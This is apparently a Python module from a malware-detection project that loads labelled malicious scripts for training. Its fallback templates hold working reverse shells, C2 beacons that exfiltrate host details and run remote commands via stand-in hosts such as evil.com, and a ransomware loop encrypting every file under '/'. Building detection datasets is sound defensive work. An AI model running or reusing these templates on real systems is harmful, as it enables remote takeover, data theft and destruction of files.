"""
Additional HuggingFace Datasets Integration
Supports InQuest, dhuynh, and cybersixgill datasets
"""

from scriptguard.utils.logger import logger
from datasets import load_dataset
from typing import List, Dict
import random

class AdditionalHFDatasets:
    """Integration for additional malware datasets from HuggingFace."""

    def __init__(self):
        """Initialize dataset loader."""
        pass

    def load_inquest_malware_samples(
        self,
        max_samples: int = 100,
        split: str = "train"
    ) -> List[Dict[str, str]]:
        """
        Load malware samples from InQuest/malware-samples dataset.

        Args:
            max_samples: Maximum number of samples to fetch
            split: Dataset split to use

        Returns:
            List of samples with code and metadata
        """
        logger.info(f"Loading InQuest malware samples (max {max_samples})")

        try:
            # Try to load dataset
            dataset = load_dataset("InQuest/malware-samples", split=split, streaming=True)

            samples = []
            for i, item in enumerate(dataset):
                if i >= max_samples:
                    break

                # Extract relevant fields - adapt to actual dataset structure
                code_content = item.get("content", item.get("data", item.get("code", "")))

                sample = {
                    "code": code_content,
                    "label": "malicious",
                    "source": "inquest",
                    "metadata": {
                        "hash": item.get("sha256", item.get("md5", "")),
                        "file_type": item.get("file_type", "unknown"),
                        "family": item.get("family", "unknown")
                    }
                }

                # Only add if we have actual code content
                if sample["code"] and len(sample["code"]) > 50:
                    samples.append(sample)

            logger.info(f"Loaded {len(samples)} samples from InQuest")
            return samples

        except Exception as e:
            logger.warning(f"InQuest dataset not available or failed: {e}")
            logger.info("Using fallback synthetic samples")
            return self._generate_fallback_malware_samples(max_samples // 2, "inquest")

    def _generate_fallback_malware_samples(self, count: int, source: str) -> List[Dict[str, str]]:
        """Generate synthetic malware samples as fallback."""
        samples = []
        malware_templates = [
            '''import socket
s = socket.socket()
s.connect(("malicious-c2.com", 4444))
s.send(b"infected")
while True:
    cmd = s.recv(1024).decode()
    output = eval(cmd)
    s.send(str(output).encode())''',

            '''import os
import base64
data = os.popen("whoami && hostname").read()
encoded = base64.b64encode(data.encode()).decode()
import urllib.request
urllib.request.urlopen("http://evil.com/log?d=" + encoded)''',

            '''from cryptography.fernet import Fernet
import os
key = Fernet.generate_key()
f = Fernet(key)
for root, dirs, files in os.walk("/"):
    for file in files:
        path = os.path.join(root, file)
        with open(path, 'rb') as fp:
            data = fp.read()
        encrypted = f.encrypt(data)
        with open(path, 'wb') as fp:
            fp.write(encrypted)'''
        ]

        for i in range(min(count, len(malware_templates))):
            samples.append({
                "code": malware_templates[i],
                "label": "malicious",
                "source": f"{source}_fallback",
                "metadata": {"type": "synthetic"}
            })

        return samples

    def load_dhuynh_malware_classification(
        self,
        max_samples: int = 100,
        split: str = "train"
    ) -> List[Dict[str, str]]:
        """
        Load malware classification data from dhuynh/malware-classification.

        Args:
            max_samples: Maximum number of samples to fetch
            split: Dataset split to use

        Returns:
            List of samples with code and malware type
        """
        logger.info(f"Loading dhuynh malware classification (max {max_samples})")

        try:
            dataset = load_dataset("dhuynh/malware-classification", split=split, streaming=True)

            samples = []
            for i, item in enumerate(dataset):
                if i >= max_samples:
                    break

                # Extract code and classification - adapt to actual structure
                code_content = item.get("code", item.get("content", item.get("data", "")))

                sample = {
                    "code": code_content,
                    "label": "malicious",
                    "source": "dhuynh",
                    "metadata": {
                        "malware_type": item.get("label", item.get("class", "unknown")),
                        "family": item.get("family", ""),
                        "category": item.get("category", "")
                    }
                }

                # Only add if we have actual code content
                if sample["code"] and len(sample["code"]) > 50:
                    samples.append(sample)

            logger.info(f"Loaded {len(samples)} samples from dhuynh")
            return samples

        except Exception as e:
            logger.warning(f"dhuynh dataset not available or failed: {e}")
            logger.info("Using fallback synthetic samples")
            return self._generate_fallback_malware_samples(max_samples // 2, "dhuynh")

    def load_cybersixgill_malicious_urls(
        self,
        max_samples: int = 100,
        split: str = "train"
    ) -> List[Dict[str, str]]:
        """
        Load malicious URLs from cybersixgill/malicious-urls-dataset.
        Converts URLs into Python scripts that demonstrate C2 communication patterns.

        Args:
            max_samples: Maximum number of samples to fetch
            split: Dataset split to use

        Returns:
            List of synthetic scripts with C2 communication patterns
        """
        logger.info(f"Loading cybersixgill malicious URLs (max {max_samples})")

        try:
            dataset = load_dataset("cybersixgill/malicious-urls-dataset", split=split, streaming=True)

            samples = []
            for i, item in enumerate(dataset):
                if i >= max_samples:
                    break

                url = item.get("url", "")
                url_type = item.get("type", item.get("category", "phishing"))

                if not url:
                    continue

                # Generate synthetic Python script that uses this URL for C2
                code = self._generate_c2_script(url, url_type)

                sample = {
                    "code": code,
                    "label": "malicious",
                    "source": "cybersixgill_c2",
                    "metadata": {
                        "c2_url": url,
                        "threat_type": url_type,
                        "pattern": "c2_communication"
                    }
                }

                samples.append(sample)

            logger.info(f"Generated {len(samples)} C2 scripts from cybersixgill")
            return samples

        except Exception as e:
            logger.warning(f"cybersixgill dataset not available or failed: {e}")
            logger.info("Generating fallback C2 samples")
            return self._generate_fallback_c2_samples(max_samples)

    def _generate_c2_script(self, url: str, threat_type: str) -> str:
        """
        Generate synthetic Python script with C2 communication pattern.

        Args:
            url: Malicious URL
            threat_type: Type of threat

        Returns:
            Python code demonstrating C2 pattern
        """
        templates = [
            # Template 1: Basic requests
            f'''import requests
import json
import time

C2_SERVER = "{url}"

def beacon():
    """Send beacon to C2 server"""
    try:
        data = {{
            "hostname": os.getenv("COMPUTERNAME"),
            "user": os.getenv("USERNAME"),
            "type": "{threat_type}"
        }}
        response = requests.post(C2_SERVER + "/beacon", json=data, timeout=5)
        return response.json()
    except Exception as e:
        return None

def exfiltrate_data(data):
    """Exfiltrate data to C2"""
    try:
        requests.post(C2_SERVER + "/data", json={{"data": data}}, timeout=10)
    except:
        pass

while True:
    cmd = beacon()
    if cmd:
        exec(cmd.get("command", ""))
    time.sleep(60)
''',
            # Template 2: urllib
            f'''import urllib.request
import urllib.parse
import json
import base64

C2_URL = "{url}"

def connect_c2():
    """Establish C2 connection"""
    data = urllib.parse.urlencode({{"action": "checkin", "type": "{threat_type}"}}).encode()
    req = urllib.request.Request(C2_URL, data=data)
    
    try:
        response = urllib.request.urlopen(req, timeout=10)
        return response.read().decode()
    except:
        return None

def send_results(results):
    """Send execution results to C2"""
    encoded = base64.b64encode(results.encode()).decode()
    data = urllib.parse.urlencode({{"results": encoded}}).encode()
    req = urllib.request.Request(C2_URL + "/results", data=data)
    urllib.request.urlopen(req)

command = connect_c2()
if command:
    output = eval(command)
    send_results(str(output))
''',
            # Template 3: socket-based
            f'''import socket
import json
import os

C2_HOST = "{url.split('://')[1].split('/')[0]}"
C2_PORT = 443

def establish_connection():
    """Connect to C2 via socket"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((C2_HOST, C2_PORT))
    
    # Send initial beacon
    info = {{
        "type": "{threat_type}",
        "os": os.name,
        "cwd": os.getcwd()
    }}
    sock.send(json.dumps(info).encode())
    
    # Receive commands
    while True:
        data = sock.recv(4096)
        if not data:
            break
        
        cmd = data.decode()
        result = os.popen(cmd).read()
        sock.send(result.encode())

establish_connection()
'''
        ]

        # Return random template
        return random.choice(templates)

    def _generate_fallback_c2_samples(self, count: int) -> List[Dict[str, str]]:
        """Generate fallback C2 communication samples."""
        fallback_urls = [
            "https://evil-c2-server.com/api",
            "http://malicious-domain.net/beacon",
            "https://attacker-infra.io/command"
        ]

        samples = []
        for i, url in enumerate(fallback_urls[:count]):
            code = self._generate_c2_script(url, "c2_fallback")
            samples.append({
                "code": code,
                "label": "malicious",
                "source": "cybersixgill_fallback",
                "metadata": {
                    "c2_url": url,
                    "threat_type": "c2_fallback",
                    "pattern": "c2_communication"
                }
            })

        return samples

    def fetch_all_datasets(
        self,
        max_per_dataset: int = 50
    ) -> List[Dict[str, str]]:
        """
        Fetch samples from all additional datasets.

        Args:
            max_per_dataset: Maximum samples per dataset

        Returns:
            Combined list of samples from all sources
        """
        all_samples = []

        # Load InQuest
        inquest_samples = self.load_inquest_malware_samples(max_samples=max_per_dataset)
        all_samples.extend(inquest_samples)

        # Load dhuynh
        dhuynh_samples = self.load_dhuynh_malware_classification(max_samples=max_per_dataset)
        all_samples.extend(dhuynh_samples)

        # Load cybersixgill C2 patterns
        c2_samples = self.load_cybersixgill_malicious_urls(max_samples=max_per_dataset)
        all_samples.extend(c2_samples)

        logger.info(f"Total samples from additional datasets: {len(all_samples)}")
        return all_samples
